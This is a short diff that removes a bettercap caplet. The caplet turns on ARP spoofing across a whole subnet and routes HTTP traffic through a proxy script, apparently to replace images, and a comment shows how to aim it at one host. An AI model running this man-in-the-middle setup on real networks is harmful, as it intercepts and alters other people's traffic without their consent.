@@ -1,8 +1,0 @@
-# targeting the whole subnet by default, to make it selective:
-#
-#   sudo bettercap -caplet caplets/repimg.cap -eval "set arp.spoof.targets 192.168.178.24"
-
-clear
-set http.proxy.script caplets/repimg.js
-http.proxy on
-arp.spoof on
